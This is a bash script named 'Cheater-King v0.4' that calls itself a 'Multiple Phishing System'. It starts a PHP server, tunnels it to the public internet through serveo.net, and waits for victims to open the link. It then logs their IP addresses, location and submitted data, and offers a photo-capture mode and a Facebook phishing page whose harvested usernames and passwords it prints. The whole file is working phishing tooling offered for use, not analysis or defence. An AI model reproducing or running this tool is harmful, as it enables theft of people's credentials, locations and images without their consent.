#!/bin/bash
# Cheater-King v 0.4
# Powered by Tiger@Mate
# Gmail:riyadshake63@gmail.com | Number : +8801323313122


trap 'printf "\n";stop' 2


# Function to run loc

#banner 
banner() {
clear
figlet Cheater-King | lolcat                                                                              
printf " \e[1;93m      Cheater-King Ver 0.4 - by Riyad Sheikh  [Tiger@Mate]\e[0m \n"
printf " \e[1;92m      gmail:riyadshake63@gmail.com | number: +8801323313122 \e[0m \n"
printf "\e[1;90m Cheater-King is Presenting a Multiple Phishing System.\e[0m \n"
printf "\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

stop() {
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt
}

checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
tail -f -n 110 data.txt
fi
sleep 0.5
done 
}

local_server() {
sed 's+forwarding_link+''+g' template.php > index.php
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:8899...\n"
php -S 127.0.0.1:8899 > /dev/null 2>&1 & 
printf "\e[1;92m[\e[0m+\e[1;92m] Starting Serveo server on Localhost...\n"
ssh -R 80:localhost:8899 serveo.net
sleep 2
checkfound
}

hound() {
if [[ -e data.txt ]]; then
cat data.txt >> targetreport.txt
rm -rf data.txt
touch data.txt
fi
if [[ -e ip.txt ]]; then
rm -rf ip.txt
fi
sed -e '/tc_payload/r payload' index_chat.html > index.html
rm -rf index.html
local_server
sleep 1
}

# Function to run picphish

#Main Menu

main_menu() {
echo "Select an option:"
echo "1. Capture Location using phishing method" 
echo "2. Capture photo using phishing method"
echo "3. Facebook Phishing "
read -p "Enter your choice: " choice

case $choice in
    1) 
        rm -rf index.html
        banner
        hound
        dependencies
        ;;
    2) 
 rm -rf index.html
 ln -s .picphish/picphish.sh trx_picphish 
 chmod +x trx_picphish 
         ./trx_picphish
    
        ;;

    3) 
     rm -rf index.html && cp -r index4.html index.html && clear
     banner
     echo " Starting the php server"
     read -p "Set a Port number for php server:" xport
     php -S 127.0.0.1:$xport > /dev/null 2>&1 &     
    echo " Starting The Serveo Server" 
    ssh -R 80:localhost:$xport serveo.net   
   echo " Password saved path html/Passwords/passlist.txt"
   echo " The Username & Password Is Below"
   cat html/Passwords/passlist.txt
   ;;

    *)
        echo "Invalid choice. Exiting."
        ;;
esac
}
banner
main_menu
